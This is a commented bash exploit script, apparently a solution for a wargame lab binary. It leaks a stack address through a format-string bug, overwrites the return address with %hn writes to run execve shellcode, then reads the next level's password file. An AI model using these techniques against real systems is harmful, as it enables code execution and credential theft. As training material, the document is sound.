#!/bin/bash

# Useful observations looking at the disassembled code:
#
#   - The target buffer is on the stack at the moment of the vulnerability, this means that
#   we can copy the address we want to overwrite into the target buffer.
#   - Full RELRO is on so we can't play with GOT/PLT or .dtor section (but there is an interesting
#   address on the stack that we can play with)
#   - There is a string with "/bin/sh" at 0xb7f83a24 (checked with peda)

# We have some constraints here. Full RELRO is preventing us from overwriting GOT/PLT or .dtor section.
# That means that there are no nice static addresses we can target, we have to look at some address on
# the stack that could lead us to the control of the eip.
# Another important limitation is that our buffer is never stored in a local variable, so it's location
# is going to be a pain to predict (since it changes depending on the length of the program name, length
# of the string, environment variables...)

# Let's start by storing our shellcode in an environment variable, this script will assemble it and
# print it in a format we can use lateri (recicled from the previous exploit).

cat > /tmp/.shellgen.py <<EOF

import pwn

pwn.context.update(arch='i386', os='linux')

instructions = [
    'xor ecx, ecx',
    'mul ecx',
    'mov ebx, 0xb7f83a24',  # Memory address of /bin/sh
    'mov al, SYS_execve',   # SYS_execve defined in pwnlib.constants
    'int 0x80'
    ]

print ''.join(map(pwn.asm, instructions))

EOF

export SHELLCODE=$(python /tmp/.shellgen.py)

cat > /tmp/.getenvaddr.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[])
{
    char *p = getenv(argv[1]);
    
    /* after some experimenting, we can determine
     the formula to get the exact memory address.
     If this exploit fails (by throwing a segmentation fault),
     there is a big chance that you may have to change it 
     to fit your environment */
    
    p += ((strlen(argv[0]) - strlen(argv[2]))*2) - 12;
                    
    printf("%p\n", p);
    return 0;
}
EOF

gcc -o /tmp/.getenvaddr /tmp/.getenvaddr.c

shelladdr=$(/tmp/.getenvaddr SHELLCODE /levels/lab04/lab4A)

# We have shellcode stored in an env var and it's address so far. Next thing
# we need to know is a valid address where we can overwrite with our shell pointer

# There is a nice place on the stack where we can place our new pointer and gain
# control of the eip. This is the position of the return address [ebp+4] in log_wrapper

# This is a little bit trickier to do since addresses of the stack shift depending
# on various things such as the env vars, program name, argument lengths...

# The nice thing about format strings is that they allow us to leak stack contents
# we just need to know if there is a stack address stored somewhere in the stack.

# Seems that there is a candidate, the old ebp! stored right after the return address.
# We can make use of the format sring bug to read this address.

# Let's build a dummy string with the same length as our exploit string and use %08x to
# read the wanted address. [ebp+0x4] is at [esp+0x13c] offset 79 from esp, but snprintf
# takes three arguments so the correct offset will be 76.

dummystr="%76\$08xAA&AAAAAx&11\$hn&AAAAAx$11\$hn"

cd /tmp

rm -fr ./backups
mkdir ./backups

/levels/lab04/lab4A $dummystr >> /dev/null

stackaddr=$(python -c 'import sys; print sys.argv[-1][:8]' $(cat ./backups/.log))

# Once we have the old ebp address, we can compute the address of the returning address.
# The address will  be at esp+4, which is equal to (ebp & 0xfffffff0) - 0x94

cat > /tmp/.fmtgen.py <<EOF
#!/usr/bin/python
# coding: utf-8

import sys
import struct

retaddr = (int(sys.argv[1], 16) & 0xfffffff0) - 0x94
shell = int(sys.argv[2], 16)

# In log_wrapper, the difference between esp and ebp is 0x138 bytes.
# This means that [ebp-0x10b] = [esp+0x2d] (location of target buffer)
# So [esp+0x2d] + 0x12 bytes of "Starting back up: " = [esp+0x3f]
# This means that the begining of our buffer will be 0x3f bytes from esp
# we need some padding to make it a multiple of 4, then add our target
# pointer which will be 0x40 bytes from esp (offset 16 + 1).

# But since snprintf takes three arguments here, we need to substract 3
# to the offset which will make it 14

# You can always open gdb and dump the stack to check the offset,
# but maths rock!!

buf = 'A'+struct.pack('<I', retaddr+2) + struct.pack('<I', retaddr)

# Now with two short writes we are able to overwrite the return address
# and place our shellcode address

buf += '%%%dx' % ((shell>>16)-9)
buf += '%14\$hn'                    # Lower bytes of the address (Little endianess!)

buf += '%%%dx' % ((shell & 0xffff)-(shell>>16))
buf += '%15\$hn'                    # Higher bytes of the address (Little endianess!)

print buf

EOF

passfile="/tmp/lab4Aend.pass"

echo "cat /home/lab4end/.pass > $passfile" | /levels/lab04/lab4A $(python /tmp/.fmtgen.py $stackaddr $shelladdr)
echo Password stored in $passfile
echo Cleaning-up dotfiles...
rm -f /tmp/.getenvaddr /tmp/getenvaddr.c /tmp/.shellgen.py /tmp/.fmtgen.py
